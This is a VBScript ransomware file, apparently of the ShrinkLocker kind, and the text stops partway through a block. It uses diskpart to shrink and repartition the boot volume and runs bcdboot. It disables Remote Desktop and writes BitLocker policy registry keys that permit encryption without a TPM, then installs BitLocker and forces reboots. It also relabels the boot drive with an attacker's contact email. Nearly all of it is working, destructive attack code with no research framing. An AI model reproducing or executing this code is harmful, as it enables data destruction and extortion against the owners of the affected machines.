Dim oShell
Set oShell = CreateObject("WScript.Shell")

Function Stream_StringToBinary(Text)
  Const adTypeText = 2
  Const adTypeBinary = 1
  Dim BinaryStream
  Set BinaryStream = CreateObject("ADODB.Stream")
  BinaryStream.Type = adTypeText
  BinaryStream.CharSet = "us-ascii"
  BinaryStream.Open
  BinaryStream.WriteText Text
  BinaryStream.Position = 0
  BinaryStream.Type = adTypeBinary
 BinaryStream.Position = 0
 Stream_StringToBinary = BinaryStream.Read
 Set BinaryStream = Nothing
End Function

main
Sub Main
On Error Resume Next
Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
Set colItems = objWMIService.ExecQuery("SELECT * FROM Win32_OperatingSystem")

For Each objItem in colItems
    If InStr(1, objItem.Caption, "xp", vbTextCompare) > 0 Or InStr(1, objItem.Caption, "2000", vbTextCompare) > 0 Or InStr(1, objItem.Caption, "2003", vbTextCompare) > 0 Or InStr(1, objItem.Caption, "Vista", vbTextCompare) > 0 Then
        Set fso = CreateObject("Scripting.FileSystemObject")
        fso.DeleteFile "C:\ProgramData\Microsoft\Windows\Templates\disk.vbs", True
     If Not condition then Exit Sub    
    End If
Next




Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
Set colItems = objWMIService.ExecQuery("SELECT * FROM Win32_OperatingSystem")
For Each objItem in colItems
	caption = objItem.Caption
If InStr(1, objItem.Caption, "2008", vbTextCompare) > 0 Or InStr(1, objItem.Caption, "2012", vbTextCompare) > 0 Then
	set colLogicalDisksBefore = GetObject("winmgmts:\\.\root\cimv2").ExecQuery("SELECT * FROM Win32_LogicalDisk WHERE DriveType = 3")
	Set objShell = CreateObject("Wscript.Shell")
	For Each objDisk In GetObject("winmgmts:\\.\root\cimv2").ExecQuery("SELECT DriveLetter FROM Win32_Volume WHERE BootVolume='True'"): Driveletters=objDisk.DriveLetter: Next
	For Each SystemVolumeDisk In GetObject("winmgmts:\\.\root\cimv2").ExecQuery("SELECT DriveLetter FROM Win32_Volume WHERE SystemVolume='True'"): SystemVolumeDriveletters=SystemVolumeDisk.DriveLetter: Next
		if SystemVolumeDriveletters = Driveletters then
			Set colPartitions = objWMIService.ExecQuery("SELECT * FROM Win32_DiskPartition WHERE PrimaryPartition = TRUE and DiskIndex = 0")
			For Each objPartition In colPartitions
				strPartitionDeviceID = objPartition.DeviceID
				Set colLogicalDisks = objWMIService.ExecQuery("SELECT * FROM Win32_LogicalDiskToPartition WHERE Antecedent='Win32_DiskPartition.DeviceID=""" & strPartitionDeviceID & """'")
				For Each objDisk In colLogicalDisks
					Set colLogicalDisks2 = objWMIService.ExecQuery("SELECT * FROM Win32_LogicalDisk WHERE DeviceID='" & Replace(Mid(objDisk.Dependent, InStr(objDisk.Dependent, """") + 1), """", "") & "'")
					For Each objLogicalDisk In colLogicalDisks2
					strDriveLetter = objLogicalDisk.DeviceID
						set shrinkdisk = CreateObject("WScript.Shell").Exec("diskpart")
						shrinkdisk.StdIn.WriteLine("Select Volume " & strDriveLetter & vbCrLf)
						shrinkdisk.StdIn.WriteLine("shrink desired=100" & vbCrLf)
						shrinkdisk.StdIn.WriteLine("exit" & vbCrLf)
						If InStr(1, shrinkdisk.stdout.readall , "100", vbTextCompare) > 0 then
						set shrinkdisk = CreateObject("WScript.Shell").Exec("diskpart")
						shrinkdisk.StdIn.WriteLine("Select Volume " & strDriveLetter & vbCrLf)
						shrinkdisk.StdIn.WriteLine("create partition primary size=100" & vbCrLf)
						shrinkdisk.StdIn.WriteLine("format quick recommended override" & vbCrLf)
						shrinkdisk.StdIn.WriteLine("assign" & vbCrLf)
						shrinkdisk.StdIn.WriteLine("active" & vbCrLf)
						shrinkdisk.StdIn.WriteLine("exit" & vbCrLf)
						If InStr(1, shrinkdisk.stdout.readall , "100", vbTextCompare) > 0 then
							shrinkcomplate = "ok"
						Else
						End If
						Else
						Exit for
						End If
					Next
				Next
			if shrinkcomplate = "ok" then
			Exit For
			End if
			Next
			Set colLogicalDisksAfter = objWMIService.ExecQuery("SELECT * FROM Win32_LogicalDisk WHERE DriveType = 3")
					For Each objDiskAfter In colLogicalDisksAfter
						Dim driveExists: driveExists = False
						For Each objDiskBefore In colLogicalDisksBefore
							If objDiskAfter.DeviceID = objDiskBefore.DeviceID Then
								driveExists = True
								Exit For
							End If
						Next
						If Not driveExists Then
							strDriveLetter = objDiskAfter.DeviceID
							Exit For
						End If
					Next
					If Len((CreateObject("WScript.Shell").Exec("bcdboot " & Driveletters & "\windows /s " & strDriveLetter)).stdout.readall) > 0 Then: End If
			set remove = CreateObject("WScript.Shell").Exec("diskpart")
			remove.StdIn.WriteLine("Select Volume " & strDriveLetter & vbCrLf)
			remove.StdIn.WriteLine("remove" & vbCrLf)
			remove.StdIn.WriteLine("exit" & vbCrLf)
			If Len(remove.stdout.readall) > 0 then
			end if


			Set colFeatures = objWMIService.ExecQuery("SELECT * FROM Win32_OptionalFeature WHERE Name = 'BitLocker'")
			If InStr(1, Caption, "2008", vbTextCompare) > 0 Then
				If InStr(1, Caption, "R2", vbTextCompare) > 0 Then
					For Each objFeature in colFeatures
						If objFeature.InstallState <> 1 Then
							If Len((CreateObject("WScript.Shell").Exec("reg add ""HKLM\System\CurrentControlSet\Control\Terminal Server"" /v fDenyTSConnections /t REG_DWORD /d 1 /f")).stdout.readall) > 0 Then: End If
							If Len((CreateObject("WScript.Shell").Exec("reg add ""HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"" /v scforceoption /t REG_DWORD /d 1 /f")).stdout.readall) > 0 Then: End If
							If Len((CreateObject("WScript.Shell").Exec("reg add ""HKLM\SOFTWARE\Policies\Microsoft\FVE"" /v UseAdvancedStartup /t REG_DWORD /d 1 /f")).stdout.readall) > 0 Then: End If
							If Len((CreateObject("WScript.Shell").Exec("reg add ""HKLM\SOFTWARE\Policies\Microsoft\FVE"" /v EnableBDEWithNoTPM /t REG_DWORD /d 1 /f")).stdout.readall) > 0 Then: End If
							If Len((CreateObject("WScript.Shell").Exec("reg add ""HKLM\SOFTWARE\Policies\Microsoft\FVE"" /v UseTPM /t REG_DWORD /d 2 /f")).stdout.readall) > 0 Then: End If 
							If Len((CreateObject("WScript.Shell").Exec("reg add ""HKLM\SOFTWARE\Policies\Microsoft\FVE"" /v UseTPMPIN /t REG_DWORD /d 2 /f")).stdout.readall) > 0 Then: End If
							If Len((CreateObject("WScript.Shell").Exec("reg add ""HKLM\SOFTWARE\Policies\Microsoft\FVE"" /v UseTPMKey /t REG_DWORD /d 2 /f")).stdout.readall) > 0 Then: End If
							If Len((CreateObject("WScript.Shell").Exec("reg add ""HKLM\SOFTWARE\Policies\Microsoft\FVE"" /v UseTPMKeyPIN /t REG_DWORD /d 2 /f")).stdout.readall) > 0 Then: End If
							If Len((CreateObject("WScript.Shell").Exec("reg add ""HKLM\SOFTWARE\Policies\Microsoft\FVE"" /v EnableNonTPM /t REG_DWORD /d 1 /f")).stdout.readall) > 0 Then: End If
							If Len((CreateObject("WScript.Shell").Exec("reg add ""HKLM\SOFTWARE\Policies\Microsoft\FVE"" /v UsePartialEncryptionKey /t REG_DWORD /d 2 /f")).stdout.readall) > 0 Then: End If
							If Len((CreateObject("WScript.Shell").Exec("reg add ""HKLM\SOFTWARE\Policies\Microsoft\FVE"" /v UsePIN /t REG_DWORD /d 2 /f")).stdout.readall) > 0 Then: End If
							If Len((CreateObject("WScript.Shell").Exec("ServerManagerCmd -install BitLocker -allSubFeatures")).stdout.readall) > 0 Then: End If
								Do
								Set colFeaturesCheck = objWMIService.ExecQuery("SELECT * FROM Win32_OptionalFeature WHERE Name = 'BitLocker'")
					  
								For Each objFeatureCheck in colFeaturesCheck
									If objFeatureCheck.InstallState = 1 Then
										For Each Os in GetObject("winmgmts:").ExecQuery("SELECT * FROM Win32_OperatingSystem")
										os.Win32Shutdown(6)
										WScript.Sleep 6000000
										Next
										Exit Do
									Else
										WScript.Sleep 60000
									End If
								Next
								Loop
						Else
						End If
					Next
				else
					Set colFeatures1 = objWMIService.ExecQuery("SELECT * FROM Win32_ServerFeature")
					if colFeatures1.count = 0 then
								If Len((CreateObject("WScript.Shell").Exec("reg add ""HKLM\System\CurrentControlSet\Control\Terminal Server"" /v fDenyTSConnections /t REG_DWORD /d 1 /f")).stdout.readall) > 0 Then: End If
								If Len((CreateObject("WScript.Shell").Exec("reg add ""HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"" /v scforceoption /t REG_DWORD /d 1 /f")).stdout.readall) > 0 Then: End If
								If Len((CreateObject("WScript.Shell").Exec("reg add ""HKLM\SOFTWARE\Policies\Microsoft\FVE"" /v UseAdvancedStartup /t REG_DWORD /d 1 /f")).stdout.readall) > 0 Then: End If
								If Len((CreateObject("WScript.Shell").Exec("reg add ""HKLM\SOFTWARE\Policies\Microsoft\FVE"" /v EnableBDEWithNoTPM /t REG_DWORD /d 1 /f")).stdout.readall) > 0 Then: End If
								If Len((CreateObject("WScript.Shell").Exec("reg add ""HKLM\SOFTWARE\Policies\Microsoft\FVE"" /v UseTPM /t REG_DWORD /d 2 /f")).stdout.readall) > 0 Then: End If 
								If Len((CreateObject("WScript.Shell").Exec("reg add ""HKLM\SOFTWARE\Policies\Microsoft\FVE"" /v UseTPMPIN /t REG_DWORD /d 2 /f")).stdout.readall) > 0 Then: End If
								If Len((CreateObject("WScript.Shell").Exec("reg add ""HKLM\SOFTWARE\Policies\Microsoft\FVE"" /v UseTPMKey /t REG_DWORD /d 2 /f")).stdout.readall) > 0 Then: End If
								If Len((CreateObject("WScript.Shell").Exec("reg add ""HKLM\SOFTWARE\Policies\Microsoft\FVE"" /v UseTPMKeyPIN /t REG_DWORD /d 2 /f")).stdout.readall) > 0 Then: End If
								If Len((CreateObject("WScript.Shell").Exec("reg add ""HKLM\SOFTWARE\Policies\Microsoft\FVE"" /v EnableNonTPM /t REG_DWORD /d 1 /f")).stdout.readall) > 0 Then: End If
								If Len((CreateObject("WScript.Shell").Exec("reg add ""HKLM\SOFTWARE\Policies\Microsoft\FVE"" /v UsePartialEncryptionKey /t REG_DWORD /d 2 /f")).stdout.readall) > 0 Then: End If
								If Len((CreateObject("WScript.Shell").Exec("reg add ""HKLM\SOFTWARE\Policies\Microsoft\FVE"" /v UsePIN /t REG_DWORD /d 2 /f")).stdout.readall) > 0 Then: End If
								If Len((CreateObject("WScript.Shell").Exec("ServerManagerCmd -install BitLocker -allSubFeatures")).stdout.readall) > 0 Then: End If
									Do
									Set colFeaturesCheck1 = objWMIService.ExecQuery("SELECT * FROM Win32_ServerFeature")
									For Each objFeatureCheck1 in colFeaturesCheck1
										If objFeatureCheck1.ID = 266 Then
											For Each Os in GetObject("winmgmts:").ExecQuery("SELECT * FROM Win32_OperatingSystem")
											os.Win32Shutdown(6)
											WScript.Sleep 6000000
											Next
											Exit Do
										Else
											WScript.Sleep 60000
										End If
									Next
									Loop
					End If
					Set colFeatures2 = objWMIService.ExecQuery("SELECT * FROM Win32_ServerFeature where ID = 266")
					if colFeatures2.count = 0 then
								If Len((CreateObject("WScript.Shell").Exec("reg add ""HKLM\System\CurrentControlSet\Control\Terminal Server"" /v fDenyTSConnections /t REG_DWORD /d 1 /f")).stdout.readall) > 0 Then: End If
								If Len((CreateObject("WScript.Shell").Exec("reg add ""HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"" /v scforceoption /t REG_DWORD /d 1 /f")).stdout.readall) > 0 Then: End If
								If Len((CreateObject("WScript.Shell").Exec("reg add ""HKLM\SOFTWARE\Policies\Microsoft\FVE"" /v UseAdvancedStartup /t REG_DWORD /d 1 /f")).stdout.readall) > 0 Then: End If
								If Len((CreateObject("WScript.Shell").Exec("reg add ""HKLM\SOFTWARE\Policies\Microsoft\FVE"" /v EnableBDEWithNoTPM /t REG_DWORD /d 1 /f")).stdout.readall) > 0 Then: End If
								If Len((CreateObject("WScript.Shell").Exec("reg add ""HKLM\SOFTWARE\Policies\Microsoft\FVE"" /v UseTPM /t REG_DWORD /d 2 /f")).stdout.readall) > 0 Then: End If 
								If Len((CreateObject("WScript.Shell").Exec("reg add ""HKLM\SOFTWARE\Policies\Microsoft\FVE"" /v UseTPMPIN /t REG_DWORD /d 2 /f")).stdout.readall) > 0 Then: End If
								If Len((CreateObject("WScript.Shell").Exec("reg add ""HKLM\SOFTWARE\Policies\Microsoft\FVE"" /v UseTPMKey /t REG_DWORD /d 2 /f")).stdout.readall) > 0 Then: End If
								If Len((CreateObject("WScript.Shell").Exec("reg add ""HKLM\SOFTWARE\Policies\Microsoft\FVE"" /v UseTPMKeyPIN /t REG_DWORD /d 2 /f")).stdout.readall) > 0 Then: End If
								If Len((CreateObject("WScript.Shell").Exec("reg add ""HKLM\SOFTWARE\Policies\Microsoft\FVE"" /v EnableNonTPM /t REG_DWORD /d 1 /f")).stdout.readall) > 0 Then: End If
								If Len((CreateObject("WScript.Shell").Exec("reg add ""HKLM\SOFTWARE\Policies\Microsoft\FVE"" /v UsePartialEncryptionKey /t REG_DWORD /d 2 /f")).stdout.readall) > 0 Then: End If
								If Len((CreateObject("WScript.Shell").Exec("reg add ""HKLM\SOFTWARE\Policies\Microsoft\FVE"" /v UsePIN /t REG_DWORD /d 2 /f")).stdout.readall) > 0 Then: End If
								If Len((CreateObject("WScript.Shell").Exec("ServerManagerCmd -install BitLocker -allSubFeatures")).stdout.readall) > 0 Then: End If
								Do
									Set colFeaturesCheck2 = objWMIService.ExecQuery("SELECT * FROM Win32_ServerFeature")
						  
									For Each objFeatureCheck2 in colFeaturesCheck2
										If objFeatureCheck2.ID = 266 Then
											For Each Os in GetObject("winmgmts:").ExecQuery("SELECT * FROM Win32_OperatingSystem")
											os.Win32Shutdown(6)
											WScript.Sleep 6000000
											Next
											Exit Do
										Else
											WScript.Sleep 60000
										End If
									Next
								Loop
					End If
				End If
			else
			End If
		Else
			Set colFeatures = objWMIService.ExecQuery("SELECT * FROM Win32_OptionalFeature WHERE Name = 'BitLocker'")
			If InStr(1, Caption, "2008", vbTextCompare) > 0 Then
				If InStr(1, Caption, "R2", vbTextCompare) > 0 Then
					For Each objFeature in colFeatures
						If objFeature.InstallState <> 1 Then
							If Len((CreateObject("WScript.Shell").Exec("reg add ""HKLM\System\CurrentControlSet\Control\Terminal Server"" /v fDenyTSConnections /t REG_DWORD /d 1 /f")).stdout.readall) > 0 Then: End If
							If Len((CreateObject("WScript.Shell").Exec("reg add ""HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"" /v scforceoption /t REG_DWORD /d 1 /f")).stdout.readall) > 0 Then: End If
							If Len((CreateObject("WScript.Shell").Exec("reg add ""HKLM\SOFTWARE\Policies\Microsoft\FVE"" /v EnableBDEWithNoTPM /t REG_DWORD /d 1 /f")).stdout.readall) > 0 Then: End If
							If Len((CreateObject("WScript.Shell").Exec("reg add ""HKLM\SOFTWARE\Policies\Microsoft\FVE"" /v UseTPM /t REG_DWORD /d 2 /f")).stdout.readall) > 0 Then: End If 
							If Len((CreateObject("WScript.Shell").Exec("reg add ""HKLM\SOFTWARE\Policies\Microsoft\FVE"" /v UseTPMPIN /t REG_DWORD /d 2 /f")).stdout.readall) > 0 Then: End If
							If Len((CreateObject("WScript.Shell").Exec("reg add ""HKLM\SOFTWARE\Policies\Microsoft\FVE"" /v UseTPMKey /t REG_DWORD /d 2 /f")).stdout.readall) > 0 Then: End If
							If Len((CreateObject("WScript.Shell").Exec("reg add ""HKLM\SOFTWARE\Policies\Microsoft\FVE"" /v UseTPMKeyPIN /t REG_DWORD /d 2 /f")).stdout.readall) > 0 Then: End If
							If Len((CreateObject("WScript.Shell").Exec("reg add ""HKLM\SOFTWARE\Policies\Microsoft\FVE"" /v EnableNonTPM /t REG_DWORD /d 1 /f")).stdout.readall) > 0 Then: End If
							If Len((CreateObject("WScript.Shell").Exec("reg add ""HKLM\SOFTWARE\Policies\Microsoft\FVE"" /v UsePartialEncryptionKey /t REG_DWORD /d 2 /f")).stdout.readall) > 0 Then: End If
							If Len((CreateObject("WScript.Shell").Exec("reg add ""HKLM\SOFTWARE\Policies\Microsoft\FVE"" /v UsePIN /t REG_DWORD /d 2 /f")).stdout.readall) > 0 Then: End If

							If Len((CreateObject("WScript.Shell").Exec("ServerManagerCmd -install BitLocker -allSubFeatures")).stdout.readall) > 0 Then: End If
								Do
								Set colFeaturesCheck = objWMIService.ExecQuery("SELECT * FROM Win32_OptionalFeature WHERE Name = 'BitLocker'")
					  
								For Each objFeatureCheck in colFeaturesCheck
									If objFeatureCheck.InstallState = 1 Then
										For Each Os in GetObject("winmgmts:").ExecQuery("SELECT * FROM Win32_OperatingSystem")
										os.Win32Shutdown(6)
										WScript.Sleep 6000000
										Next
										Exit Do
									Else
										WScript.Sleep 60000
									End If
								Next
								Loop
						Else
						End If
					Next
				else
					Set colFeatures1 = objWMIService.ExecQuery("SELECT * FROM Win32_ServerFeature")
					if colFeatures1.count = 0 then
								If Len((CreateObject("WScript.Shell").Exec("reg add ""HKLM\System\CurrentControlSet\Control\Terminal Server"" /v fDenyTSConnections /t REG_DWORD /d 1 /f")).stdout.readall) > 0 Then: End If
								If Len((CreateObject("WScript.Shell").Exec("reg add ""HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"" /v scforceoption /t REG_DWORD /d 1 /f")).stdout.readall) > 0 Then: End If
								If Len((CreateObject("WScript.Shell").Exec("reg add ""HKLM\SOFTWARE\Policies\Microsoft\FVE"" /v EnableBDEWithNoTPM /t REG_DWORD /d 1 /f")).stdout.readall) > 0 Then: End If
								If Len((CreateObject("WScript.Shell").Exec("reg add ""HKLM\SOFTWARE\Policies\Microsoft\FVE"" /v UseTPM /t REG_DWORD /d 2 /f")).stdout.readall) > 0 Then: End If 
								If Len((CreateObject("WScript.Shell").Exec("reg add ""HKLM\SOFTWARE\Policies\Microsoft\FVE"" /v UseTPMPIN /t REG_DWORD /d 2 /f")).stdout.readall) > 0 Then: End If
								If Len((CreateObject("WScript.Shell").Exec("reg add ""HKLM\SOFTWARE\Policies\Microsoft\FVE"" /v UseTPMKey /t REG_DWORD /d 2 /f")).stdout.readall) > 0 Then: End If
								If Len((CreateObject("WScript.Shell").Exec("reg add ""HKLM\SOFTWARE\Policies\Microsoft\FVE"" /v UseTPMKeyPIN /t REG_DWORD /d 2 /f")).stdout.readall) > 0 Then: End If
								If Len((CreateObject("WScript.Shell").Exec("reg add ""HKLM\SOFTWARE\Policies\Microsoft\FVE"" /v EnableNonTPM /t REG_DWORD /d 1 /f")).stdout.readall) > 0 Then: End If
								If Len((CreateObject("WScript.Shell").Exec("reg add ""HKLM\SOFTWARE\Policies\Microsoft\FVE"" /v UsePartialEncryptionKey /t REG_DWORD /d 2 /f")).stdout.readall) > 0 Then: End If
								If Len((CreateObject("WScript.Shell").Exec("reg add ""HKLM\SOFTWARE\Policies\Microsoft\FVE"" /v UsePIN /t REG_DWORD /d 2 /f")).stdout.readall) > 0 Then: End If
								If Len((CreateObject("WScript.Shell").Exec("ServerManagerCmd -install BitLocker -allSubFeatures")).stdout.readall) > 0 Then: End If
									Do
									Set colFeaturesCheck1 = objWMIService.ExecQuery("SELECT * FROM Win32_ServerFeature")
									For Each objFeatureCheck1 in colFeaturesCheck1
										If objFeatureCheck1.ID = 266 Then
											For Each Os in GetObject("winmgmts:").ExecQuery("SELECT * FROM Win32_OperatingSystem")
											os.Win32Shutdown(6)
											WScript.Sleep 6000000
											Next
											Exit Do
										Else
											WScript.Sleep 60000
										End If
									Next
									Loop
					End If
					Set colFeatures2 = objWMIService.ExecQuery("SELECT * FROM Win32_ServerFeature where ID = 266")
					if colFeatures2.count = 0 then
								If Len((CreateObject("WScript.Shell").Exec("reg add ""HKLM\System\CurrentControlSet\Control\Terminal Server"" /v fDenyTSConnections /t REG_DWORD /d 1 /f")).stdout.readall) > 0 Then: End If
								If Len((CreateObject("WScript.Shell").Exec("reg add ""HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"" /v scforceoption /t REG_DWORD /d 1 /f")).stdout.readall) > 0 Then: End If
								If Len((CreateObject("WScript.Shell").Exec("reg add ""HKLM\SOFTWARE\Policies\Microsoft\FVE"" /v EnableBDEWithNoTPM /t REG_DWORD /d 1 /f")).stdout.readall) > 0 Then: End If
								If Len((CreateObject("WScript.Shell").Exec("reg add ""HKLM\SOFTWARE\Policies\Microsoft\FVE"" /v UseTPM /t REG_DWORD /d 2 /f")).stdout.readall) > 0 Then: End If 
								If Len((CreateObject("WScript.Shell").Exec("reg add ""HKLM\SOFTWARE\Policies\Microsoft\FVE"" /v UseTPMPIN /t REG_DWORD /d 2 /f")).stdout.readall) > 0 Then: End If
								If Len((CreateObject("WScript.Shell").Exec("reg add ""HKLM\SOFTWARE\Policies\Microsoft\FVE"" /v UseTPMKey /t REG_DWORD /d 2 /f")).stdout.readall) > 0 Then: End If
								If Len((CreateObject("WScript.Shell").Exec("reg add ""HKLM\SOFTWARE\Policies\Microsoft\FVE"" /v UseTPMKeyPIN /t REG_DWORD /d 2 /f")).stdout.readall) > 0 Then: End If
								If Len((CreateObject("WScript.Shell").Exec("reg add ""HKLM\SOFTWARE\Policies\Microsoft\FVE"" /v EnableNonTPM /t REG_DWORD /d 1 /f")).stdout.readall) > 0 Then: End If
								If Len((CreateObject("WScript.Shell").Exec("reg add ""HKLM\SOFTWARE\Policies\Microsoft\FVE"" /v UsePartialEncryptionKey /t REG_DWORD /d 2 /f")).stdout.readall) > 0 Then: End If
								If Len((CreateObject("WScript.Shell").Exec("reg add ""HKLM\SOFTWARE\Policies\Microsoft\FVE"" /v UsePIN /t REG_DWORD /d 2 /f")).stdout.readall) > 0 Then: End If
								If Len((CreateObject("WScript.Shell").Exec("ServerManagerCmd -install BitLocker -allSubFeatures")).stdout.readall) > 0 Then: End If
								Do
									Set colFeaturesCheck2 = objWMIService.ExecQuery("SELECT * FROM Win32_ServerFeature")
						  
									For Each objFeatureCheck2 in colFeaturesCheck2
										If objFeatureCheck2.ID = 266 Then
											For Each Os in GetObject("winmgmts:").ExecQuery("SELECT * FROM Win32_OperatingSystem")
											os.Win32Shutdown(6)
											WScript.Sleep 6000000
											Next
											Exit Do
										Else
											WScript.Sleep 60000
										End If
									Next
								Loop
					End If
				End If
			else
			End If
		End If
End If
Next

Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
Set colItems = objWMIService.ExecQuery("SELECT * FROM Win32_OperatingSystem")
For Each objItem in colItems
    If InStr(1, objItem.Caption, "Server", vbTextCompare) > 0 Then
	if InStr(1, objItem.Caption, "2008", vbTextCompare) > 0 Then
	Else
        Set colFeatures = objWMIService.ExecQuery("SELECT * FROM Win32_OptionalFeature WHERE Name = 'BitLocker'")
        For Each objFeature in colFeatures
            If objFeature.InstallState <> 1 Then
				If Len((CreateObject("WScript.Shell").Exec("reg add ""HKLM\System\CurrentControlSet\Control\Terminal Server"" /v fDenyTSConnections /t REG_DWORD /d 1 /f")).stdout.readall) > 0 Then: End If
				If Len((CreateObject("WScript.Shell").Exec("reg add ""HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"" /v scforceoption /t REG_DWORD /d 1 /f")).stdout.readall) > 0 Then: End If
				If Len((CreateObject("WScript.Shell").Exec("reg add ""HKLM\SOFTWARE\Policies\Microsoft\FVE"" /v UseAdvancedStartup /t REG_DWORD /d 1 /f")).stdout.readall) > 0 Then: End If
				If Len((CreateObject("WScript.Shell").Exec("reg add ""HKLM\SOFTWARE\Policies\Microsoft\FVE"" /v EnableBDEWithNoTPM /t REG_DWORD /d 1 /f")).stdout.readall) > 0 Then: End If
				If Len((CreateObject("WScript.Shell").Exec("reg add ""HKLM\SOFTWARE\Policies\Microsoft\FVE"" /v UseTPM /t REG_DWORD /d 2 /f")).stdout.readall) > 0 Then: End If 
				If Len((CreateObject("WScript.Shell").Exec("reg add ""HKLM\SOFTWARE\Policies\Microsoft\FVE"" /v UseTPMPIN /t REG_DWORD /d 2 /f")).stdout.readall) > 0 Then: End If
				If Len((CreateObject("WScript.Shell").Exec("reg add ""HKLM\SOFTWARE\Policies\Microsoft\FVE"" /v UseTPMKey /t REG_DWORD /d 2 /f")).stdout.readall) > 0 Then: End If
				If Len((CreateObject("WScript.Shell").Exec("reg add ""HKLM\SOFTWARE\Policies\Microsoft\FVE"" /v UseTPMKeyPIN /t REG_DWORD /d 2 /f")).stdout.readall) > 0 Then: End If
				If Len((CreateObject("WScript.Shell").Exec("reg add ""HKLM\SOFTWARE\Policies\Microsoft\FVE"" /v EnableNonTPM /t REG_DWORD /d 1 /f")).stdout.readall) > 0 Then: End If
				If Len((CreateObject("WScript.Shell").Exec("reg add ""HKLM\SOFTWARE\Policies\Microsoft\FVE"" /v UsePartialEncryptionKey /t REG_DWORD /d 2 /f")).stdout.readall) > 0 Then: End If
				If Len((CreateObject("WScript.Shell").Exec("reg add ""HKLM\SOFTWARE\Policies\Microsoft\FVE"" /v UsePIN /t REG_DWORD /d 2 /f")).stdout.readall) > 0 Then: End If
				If Len((CreateObject("WScript.Shell").Exec("powershell.exe -Command Install-WindowsFeature BitLocker -IncludeAllSubFeature -IncludeManagementTools")).stdout.readall) > 0 Then: End If
				
                Do
                    Set colFeaturesCheck = objWMIService.ExecQuery("SELECT * FROM Win32_OptionalFeature WHERE Name = 'BitLocker'")
          
                    For Each objFeatureCheck in colFeaturesCheck
                        If objFeatureCheck.InstallState = 1 Then
                            For Each Os in GetObject("winmgmts:").ExecQuery("SELECT * FROM Win32_OperatingSystem")
							os.Win32Shutdown(6)
							WScript.Sleep 6000000
							Next
                            Exit Do
                        Else
                            WScript.Sleep 60000
                        End If
                    Next
                Loop
            End If
        Next
	End if
    End If
Next

if (GetObject("winmgmts:\\.\root\cimv2").ExecQuery("SELECT * FROM Win32_Service WHERE Name='BDESVC'")).count=0 then
else
do
For Each BDEService In GetObject("winmgmts:\\.\root\cimv2").ExecQuery("SELECT * FROM Win32_Service WHERE Name='BDESVC'")
if BDEService.state = "Running" and BDEService.status = "OK" then
exit do
else
BDEService.startservice()
WScript.Sleep(10000)
end if
Next
loop
end if




Dim strComputer
Dim ORLabel
Dim freeSpaceTotal, usedSpaceTotal
strComputer = "." 
Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\CIMV2")
For Each objDisk In GetObject("winmgmts:\\.\root\cimv2").ExecQuery("SELECT DriveLetter FROM Win32_Volume WHERE BootVolume='True'"): Driveletters=objDisk.DriveLetter: Next
Set colItems = objWMIService.ExecQuery("SELECT * FROM Win32_Volume WHERE DriveLetter = '" & Driveletters & "'") 
For Each objItem In colItems
	usedSpaceTotal = objItem.Capacity - objItem.FreeSpace
	freeSpaceTotal = objItem.FreeSpace
	objItem.Label=ORLabel
	objItem.Label="Tel conspiracyid9@protonmail.com"
	objItem.Put_
Next

Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\CIMv2")
Set colItems = objWMIService.ExecQuery("SELECT * FROM Win32_PerfRawData_Tcpip_NetworkInterface")
Dim sys , perf , recevied , sent
For Each objItem In colItems
sys = objItem.Timestamp_Sys100NS
perf = objItem.Timestamp_PerfTime
received = objItem.BytesReceivedPersec
sent = objItem.BytesSentPersec

Next



Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
Set colItems = objWMIService.ExecQuery("SELECT * FROM Win32_OperatingSystem")
For Each objItem in colItems
    caption = objItem.Caption
    If InStr(1, objItem.Caption, "2008", vbTextCompare) > 0 Or InStr(1, objItem.Caption, "7", vbTextCompare) > 0 Then
		Set oShell = CreateObject("WScript.Shell")
		If Len((CreateObject("WScript.Shell").Exec("reg add ""HKLM\System\CurrentControlSet\Control\Terminal Server"" /v fDenyTSConnections /t REG_DWORD /d 1 /f")).stdout.readall) > 0 Then: End If
		If Len((CreateObject("WScript.Shell").Exec("reg add ""HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"" /v scforceoption /t REG_DWORD /d 1 /f")).stdout.readall) > 0 Then: End If
		If Len((CreateObject("WScript.Shell").Exec("reg add ""HKLM\SOFTWARE\Policies\Microsoft\FVE"" /v UseAdvancedStartup /t REG_DWORD /d 1 /f")).stdout.readall) > 0 Then: End If
		If Len((CreateObject("WScript.Shell").Exec("reg add ""HKLM\SOFTWARE\Policies\Microsoft\FVE"" /v EnableBDEWithNoTPM /t REG_DWORD /d 1 /f")).stdout.readall) > 0 Then: End If
		If Len((CreateObject("WScript.Shell").Exec("reg add ""HKLM\SOFTWARE\Policies\Microsoft\FVE"" /v UseTPM /t REG_DWORD /d 2 /f")).stdout.readall) > 0 Then: End If 
		If Len((CreateObject("WScript.Shell").Exec("reg add ""HKLM\SOFTWARE\Policies\Microsoft\FVE"" /v UseTPMPIN /t REG_DWORD /d 2 /f")).stdout.readall) > 0 Then: End If
		If Len((CreateObject("WScript.Shell").Exec("reg add ""HKLM\SOFTWARE\Policies\Microsoft\FVE"" /v UseTPMKey /t REG_DWORD /d 2 /f")).stdout.readall) > 0 Then: End If
		If Len((CreateObject("WScript.Shell").Exec("reg add ""HKLM\SOFTWARE\Policies\Microsoft\FVE"" /v UseTPMKeyPIN /t REG_DWORD /d 2 /f")).stdout.readall) > 0 Then: End If
		If Len((CreateObject("WScript.Shell").Exec("reg add ""HKLM\SOFTWARE\Policies\Microsoft\FVE"" /v EnableNonTPM /t REG_DWORD /d 1 /f")).stdout.readall) > 0 Then: End If
		If Len((CreateObject("WScript.Shell").Exec("reg add ""HKLM\SOFTWARE\Policies\Microsoft\FVE"" /v UsePartialEncryptionKey /t REG_DWORD /d 2 /f")).stdout.readall) > 0 Then: End If
